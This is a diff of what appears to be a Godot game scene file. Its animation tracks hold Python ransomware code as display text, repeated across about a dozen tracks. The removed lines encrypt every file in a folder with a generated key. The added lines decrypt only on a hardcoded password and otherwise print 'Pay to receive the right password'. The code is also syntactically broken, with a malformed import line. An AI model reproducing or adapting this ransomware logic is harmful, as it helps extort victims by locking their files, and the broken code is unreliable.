@@ -274,7 +274,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["wow text"]
+"values": ["import os from cryptography.fernet
+import fernet
+
+allfiles = []
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+
+print(allfiles)
+
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
+
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -334,7 +361,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.26)]
+"values": [Vector2(3.025, 0.565)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -361,29 +388,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -433,7 +465,7 @@ tracks/4/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(0.135, 0.45)]
+"values": [Vector2(0.135, 1.06)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -445,7 +477,7 @@ tracks/5/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 0,
-"values": [Vector2(3.025, 0.26)]
+"values": [Vector2(3.675, 2.78)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -472,29 +504,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -581,29 +618,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -690,29 +732,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -805,29 +852,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -914,29 +966,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1023,29 +1080,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1134,29 +1196,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1245,29 +1312,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1358,29 +1430,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1467,29 +1544,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
@@ -1578,29 +1660,34 @@ tracks/0/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
-"values": ["import os from cryptography.fernet 
+"values": ["import os from cryptography.fernet
 import fernet
 
-allfiles = [ ]
+allfiles = []
 for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+	if file == 'malware.py' or file == 'key.key' or file == 'decr.py':
 		continue
 	if os.path.isfile(file):
 		allfiles.append(file)
-print (allfiles)
 
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
+print(allfiles)
 
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
+with open('key.key', 'rb') as key:
+		password = key.read()
+passphrase = 'WhiteHat'
+userpass = input('Enter the password you received from us:')
 
-print('All your files have been encrypted')"]
+if userpass == passphrase:
+	for file in allfiles:
+		with open(file, 'rb') as thefile:
+			 contents = thefile.read()
+		content_decr = Fernet(password).decrypt(contents)
+		with open(file, 'wb') as thefile:
+ 			thefile.write(content_decr)
+		print(\"You got your files back\")
+else: 
+        print (\"Wrong password! Pay to receive the right password\")
+"]
 }
 tracks/1/type = "value"
 tracks/1/imported = false
